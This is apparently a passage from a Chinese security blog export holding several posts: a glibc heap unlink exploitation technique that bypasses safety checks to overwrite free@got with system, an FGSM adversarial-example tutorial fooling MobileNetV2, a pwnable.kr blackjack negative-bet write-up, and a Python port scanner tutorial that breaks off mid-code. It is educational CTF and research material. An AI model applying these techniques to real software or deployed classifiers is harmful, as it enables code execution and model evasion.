<h2 id="对抗技术"><a href="#对抗技术" class="headerlink" title="对抗技术"></a>对抗技术</h2><h3 id="Double-Free检测"><a href="#Double-Free检测" class="headerlink" title="Double Free检测"></a>Double Free检测</h3><p>该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。相关代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used. */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<h3 id="next-size非法检测"><a href="#next-size非法检测" class="headerlink" title="next size非法检测"></a>next size非法检测</h3><p>该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。相关代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">             || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))&#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双链表冲突检测"><a href="#双链表冲突检测" class="headerlink" title="双链表冲突检测"></a>双链表冲突检测</h3><p>该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。相关代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br></pre></td></tr></table></figure>

<p>但记住，即使由上述三种检测方式并不意味着unlink技术都会失效，攻防是一个此消彼长的过程，例如下面介绍一种绕过安全检验的方法（注意具体情况具体分析）。</p>
<h2 id="绕过安全校验"><a href="#绕过安全校验" class="headerlink" title="绕过安全校验"></a>绕过安全校验</h2><p>首先，需要了解 glibc 中 unlink 的校验机制。以下为 glibc-2.19 中 unlink 宏的部分代码，在删除 P 节点之前会检查 <code>FD-&gt;bk != P || BK-&gt;fd != P</code> 是否成立，即检查当前 chunk 前一个 chunk 的 bk 与后一个 chunk 的 fd 是否指向当前 chunk。若当前 chunk 的 fd 和 bk 被修改则无法通过这项检查，<code>FD-&gt;bk = BK</code> 与 <code>BK-&gt;fd = FD</code> 不会执行，导致 unlink 攻击不能进行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;         \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br><span class="line">    <span class="keyword">else</span> &#123;								          \</span><br><span class="line">        FD-&gt;bk = BK;						    \</span><br><span class="line">        BK-&gt;fd = FD;						    \</span><br><span class="line">        ...</span><br><span class="line">    &#125;									              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>为了绕过以上指针校验，需要以下条件：</p>
<blockquote>
<p>a） 程序中存在一个全局指针变量 ptr<br>         b） ptr 指向的堆内存可由用户控制</p>
</blockquote>
<p>若具备以上条件，攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P，根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk，使得 <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code> 成立。具体如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = ptr - <span class="number">0xC</span></span><br><span class="line">P-&gt;bk = ptr - <span class="number">0x8</span></span><br></pre></td></tr></table></figure>

<p>在执行 unlink（P）时的指针操作如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = P-&gt;fd = ptr - <span class="number">0xC</span>;</span><br><span class="line"><span class="number">2</span>）BK = P-&gt;bk = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="comment">// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr</span></span><br><span class="line"><span class="comment">// 由于 ptr 指向 P,可成功绕过指针校验</span></span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *ptr = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *ptr = ptr - <span class="number">0xC</span>。</span><br></pre></td></tr></table></figure>

<p>由以上过程可知，借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制，并通过 unlink 攻击实现写内存，最终使得 ptr 指向 ptr - 0xc。</p>
<p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0xC + free@got</code>，使得 ptr 指向 free@got，再次对 ptr 指向的内存进行写入，可以把 free@got 修改为 system 的地址，之后调用 free 可任意命令执行。</p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Heap</category>
        <category>Heap_Attack</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>阅读深度学习的对抗攻击方法综述及实例</title>
    <url>/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/0.png" class></strong></p>
 <a id="more"></a>

<div class="pdfobject-container" data-target="/PDF/深度学习的对抗攻击方法综述.pdf" data-height="500px"></div>

<p>对抗样本攻击大体原理如下：</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/3.png" class></strong></p>
<h3 id="什么是对抗性例子？"><a href="#什么是对抗性例子？" class="headerlink" title="什么是对抗性例子？"></a>什么是对抗性例子？</h3><p>对抗性示例是专门创建的输入，其目的是混淆神经网络，从而导致给定输入的分类错误。这些臭名昭著的输入对于人眼是无法区分的，但是会导致网络无法识别图像的内容。这类攻击有几种类型，但是，这里的重点是快速梯度符号方法攻击，这是一种<em>白盒</em>攻击，其目的是确保错误分类。白盒攻击是攻击者可以完全访问被攻击模型的地方。举下面两个例子：</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/2.png" class></strong></p>
<p>原始图像（左图），对抗噪声（中图），扰动后的图片即对抗样本（右图）被错误地分类为数字 2。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/1.png" class></strong></p>
<p>在这里，从熊猫的图像开始，攻击者向原始图像添加了较小的扰动（失真），这导致模型以较高的置信度将该图像标记为长臂猿。下面说明添加这些扰动的过程。</p>
<h3 id="快速梯度符号法-FGSM"><a href="#快速梯度符号法-FGSM" class="headerlink" title="快速梯度符号法(FGSM)"></a>快速梯度符号法(FGSM)</h3><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/11.png" class></strong></p>
<p>下面展示简单的利用<a href="https://blog.csdn.net/crystal_sugar/article/details/106023055?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">FGSM原理</a>实现的示例。</p>
<p><strong>FGSM</strong>的工作原理是利用神经网络的梯度来创建一个<strong>Adversarial example</strong>。对于输入图像，该方法使用相对于输入图像的损失的梯度来创建使损失函数最大化的新图像。这个新图像被称为对抗图像。</p>
<p>在这里，梯度是相对于输入的图像的。这样做是因为其目标是创造一个最大化损失的图像。实现这一点的方法是找出图像中每个像素对损失值的贡献程度，并相应地添加一个扰动（使用链式规则去计算梯度可以很容易地找到每个输入像素的贡献程度）。此外，由于模型不再被训练（因此梯度不针对可训练变量，即模型参数），因此模型参数保持不变。唯一的目的就是使一个已经受过训练的模型发生错误的分类。<br>在这篇文章中，模型是<strong>MobileNetV2</strong>模型，在<strong>ImageNet</strong>上进行了预训练。</p>
<h3 id="导入所需要的库"><a href="#导入所需要的库" class="headerlink" title="导入所需要的库"></a>导入所需要的库</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="keyword">as</span> mpl</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure>

<h3 id="设置图片相关信息"><a href="#设置图片相关信息" class="headerlink" title="设置图片相关信息"></a>设置图片相关信息</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 图片像素</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;figure.figsize&#x27;</span>] = (<span class="number">8</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># 图片网格</span></span><br><span class="line">mpl.rcParams[<span class="string">&#x27;axes.grid&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="载入MobileNetV2模型"><a href="#载入MobileNetV2模型" class="headerlink" title="载入MobileNetV2模型"></a>载入<a href="https://www.tensorflow.org/api_docs/python/tf/keras/applications/MobileNetV2">MobileNetV2</a>模型</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pretrained_model = tf.keras.applications.MobileNetV2(include_top=<span class="literal">True</span>, weights=<span class="string">&#x27;imagenet&#x27;</span>)</span><br><span class="line">pretrained_model.trainable = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h3 id="图像预处理"><a href="#图像预处理" class="headerlink" title="图像预处理"></a>图像预处理</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess</span>(<span class="params">image</span>):</span></span><br><span class="line">    image = tf.cast(image, tf.float32)</span><br><span class="line">    image = image/<span class="number">255</span></span><br><span class="line">    image = tf.image.resize(image, (<span class="number">224</span>, <span class="number">224</span>))</span><br><span class="line">    image = image[<span class="literal">None</span>, ...]</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取图片信息</span></span><br><span class="line">image_path = tf.keras.utils.get_file(<span class="string">&#x27;YellowLabradorLooking_new.jpg&#x27;</span>,<span class="string">&#x27;https://storage.googleapis.com/download.tensorflow.org/example_images/YellowLabradorLooking_new.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">image_raw = tf.io.read_file(image_path)</span><br><span class="line">image = tf.image.decode_image(image_raw)</span><br><span class="line"></span><br><span class="line">image = preprocess(image)</span><br></pre></td></tr></table></figure>

<h3 id="将图像输入模型并得到概率最高的分类结果"><a href="#将图像输入模型并得到概率最高的分类结果" class="headerlink" title="将图像输入模型并得到概率最高的分类结果"></a>将图像输入模型并得到概率最高的分类结果</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Helper function to extract labels from probability vector</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imagenet_label</span>(<span class="params">probs</span>):</span></span><br><span class="line">    <span class="keyword">return</span> tf.keras.applications.mobilenet_v2.decode_predictions(probs, top=<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">image_probs = pretrained_model.predict(image)</span><br></pre></td></tr></table></figure>

<h3 id="展示图像"><a href="#展示图像" class="headerlink" title="展示图像"></a>展示图像</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure()</span><br><span class="line">plt.imshow(image[<span class="number">0</span>])</span><br><span class="line">_, image_class, class_confidence = get_imagenet_label(image_probs)</span><br><span class="line">plt.title(<span class="string">&#x27;&#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;</span>.format(image_class, class_confidence*<span class="number">100</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/4.png" class></strong></p>
<p>可以准确地预测出图像为拉布拉多犬（可能性最高为37.16%）</p>
<h3 id="计算梯度"><a href="#计算梯度" class="headerlink" title="计算梯度"></a>计算梯度</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">loss_object = tf.keras.losses.CategoricalCrossentropy()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_adversarial_pattern</span>(<span class="params">input_image, input_label</span>):</span></span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">        tape.watch(input_image)</span><br><span class="line">        prediction = pretrained_model(input_image)</span><br><span class="line">        loss = loss_object(input_label, prediction)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the gradients of the loss w.r.t to the input image.</span></span><br><span class="line">    gradient = tape.gradient(loss, input_image)</span><br><span class="line">    <span class="comment"># Get the sign of the gradients to create the perturbation</span></span><br><span class="line">    signed_grad = tf.sign(gradient)</span><br><span class="line">    <span class="keyword">return</span> signed_grad</span><br></pre></td></tr></table></figure>

<h3 id="打印添加的噪音图像"><a href="#打印添加的噪音图像" class="headerlink" title="打印添加的噪音图像"></a>打印添加的噪音图像</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get the input label of the image.</span></span><br><span class="line">labrador_retriever_index = <span class="number">208</span></span><br><span class="line">label = tf.one_hot(labrador_retriever_index, image_probs.shape[<span class="number">-1</span>])</span><br><span class="line">label = tf.reshape(label, (<span class="number">1</span>, image_probs.shape[<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line">perturbations = create_adversarial_pattern(image, label)</span><br><span class="line">plt.imshow(perturbations[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/5.png" class></strong></p>
<h3 id="定义显示图像的函数"><a href="#定义显示图像的函数" class="headerlink" title="定义显示图像的函数"></a>定义显示图像的函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_images</span>(<span class="params">image, description</span>):</span></span><br><span class="line">    _, label, confidence = get_imagenet_label(pretrained_model.predict(image))</span><br><span class="line">    plt.figure()</span><br><span class="line">    plt.imshow(image[<span class="number">0</span>])</span><br><span class="line">    plt.title(<span class="string">&#x27;&#123;&#125; \n &#123;&#125; : &#123;:.2f&#125;% Confidence&#x27;</span>.format(description,</span><br><span class="line">                                                   label, confidence*<span class="number">100</span>))</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>

<h3 id="加入噪声后再将图像输入模型进行判断"><a href="#加入噪声后再将图像输入模型进行判断" class="headerlink" title="加入噪声后再将图像输入模型进行判断"></a>加入噪声后再将图像输入模型进行判断</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">epsilons = [<span class="number">0</span>, <span class="number">0.01</span>, <span class="number">0.1</span>, <span class="number">0.15</span>]</span><br><span class="line">descriptions = [(<span class="string">&#x27;Epsilon = &#123;:0.3f&#125;&#x27;</span>.format(eps) <span class="keyword">if</span> eps <span class="keyword">else</span> <span class="string">&#x27;Input&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> eps <span class="keyword">in</span> epsilons]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, eps <span class="keyword">in</span> enumerate(epsilons):</span><br><span class="line">    adv_x = image + eps*perturbations</span><br><span class="line">    adv_x = tf.clip_by_value(adv_x, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    display_images(adv_x, descriptions[i])</span><br></pre></td></tr></table></figure>

<p>其中<strong>epsilons</strong> 表示噪声的干扰程度。</p>
<h4 id="输入图片"><a href="#输入图片" class="headerlink" title="输入图片"></a>输入图片</h4><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/6.png" class></strong></p>
<h4 id="噪声为0-01"><a href="#噪声为0-01" class="headerlink" title="噪声为0.01"></a>噪声为0.01</h4><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/7.png" class></strong></p>
<p>识别为Ibizan柴犬</p>
<h4 id="噪声为0-1"><a href="#噪声为0-1" class="headerlink" title="噪声为0.1"></a>噪声为0.1</h4><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/8.png" class></strong></p>
<p>识别为浴巾</p>
<h3 id="噪声为0-15"><a href="#噪声为0-15" class="headerlink" title="噪声为0.15"></a>噪声为0.15</h3><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/9.png" class></strong></p>
<p>识别为脑珊瑚</p>
<h3 id="噪声为0-20"><a href="#噪声为0-20" class="headerlink" title="噪声为0.20"></a>噪声为0.20</h3><p><strong><img src="/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/10.png" class></strong></p>
<p>识别为毛毯</p>
<p>可见，输入图片添加噪声之后已经不能正确分类。</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>Adversarial sample</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>blackjack</title>
    <url>/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/0.png" class></strong></p>
 <a id="more"></a>

<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/1.png" class></strong></p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>本题链接打不开了！！！ 只能参考别人的wp</p>
<p>有两个比较关键的点</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/2.png" class></strong></p>
<p>判断用户下注的金额如果大于用户拥有的金额，则会提示用户不能下注，但程序的漏洞在于如果输入的金额是负数，会直接通过，并且返回输入的下注金额。</p>
<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/3.png" class></strong></p>
<p>如果用户输了，则会扣除用户下注的金额，这里使用简单的减法操作，结合前面下注金额可以为负数，则直接输入一个很大的负数，之后故意输掉比赛，使得金额超过阈值拿到flag。</p>
<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/4.png" class></strong></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>Pwnable.kr</category>
        <category>Toddler&#39;s Bottle</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>python实现端口扫描器</title>
    <url>/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/0.png" class></strong></p>
 <a id="more"></a>

<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的连接，防止拒绝服务攻击。这种端口扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的 IP 地址，入侵检测系统可能触发警报。$–&gt;$（<a href="https://xz.aliyun.com/t/5376#toc-0">端口扫描类型</a>）</p>
<p>还有另外一种扫描方式是 SYN 扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送 IP 数据包，并监控其回应。这种扫描模式被称为 “半开放扫描”，因为它从不建立完整的 TCP 连接。端口扫描工具生成一个 SYN 包，如果目标端口开放，则会返回 SYN-ACK 包。扫描端回应一个 RST 包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回 RST 包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但 SYN 扫描的优势是从不会建立完整的连接。然而，RST 包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。</p>
<p>实例中采用的是第一种扫描方式，直接利用操作系统的 socket 连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态。$–&gt;$（<a href="https://gist.github.com/kevinkindom/108ffd675cb9253f8f71">socket编程基础</a>）</p>
<h3 id="实现单线程扫描功能"><a href="#实现单线程扫描功能" class="headerlink" title="实现单线程扫描功能"></a>实现单线程扫描功能</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现从程序外部向程序传递参数</span></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">portstrs = sys.argv[<span class="number">2</span>].split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描端口范围</span></span><br><span class="line">start_port = int(portstrs[<span class="number">0</span>])</span><br><span class="line">end_port = int(portstrs[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标ip地址</span></span><br><span class="line">target_ip = gethostbyname(host)</span><br><span class="line">opened_ports = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行循环连接</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start_port, end_port):</span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">10</span>)</span><br><span class="line">    result = sock.connect_ex((target_ip, port))</span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        opened_ports.append(port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印开放的端口</span></span><br><span class="line">print(<span class="string">&quot;Opened ports:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> opened_ports:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>

<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/2.png" class></strong></p>
<p>上面代码实现了单线程扫描端口的测试，但是正常的程序在执行中我们需要考虑执行效率和提升性能，所以需要实现多线程程序。</p>
<h3 id="多线程扫描"><a href="#多线程扫描" class="headerlink" title="多线程扫描"></a>多线程扫描</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> gevent.pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TCP_connect</span>(<span class="params">ip, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟TCP连接&quot;&quot;&quot;</span></span><br><span class="line">    TCP_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    TCP_sock.settimeout(<span class="number">0.5</span>)  <span class="comment"># 设置连接超时</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = TCP_sock.connect_ex((ip, int(port)))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;[*]%s 端口 开启\t&quot;</span> % port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(&quot;[!]%s端口 关闭&quot;%port)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        TCP_sock.close()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]错误:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_ip</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标IP&quot;&quot;&quot;</span></span><br><span class="line">    ip = input(<span class="string">&quot;[+]输入扫描目标IP:&quot;</span>)</span><br><span class="line">    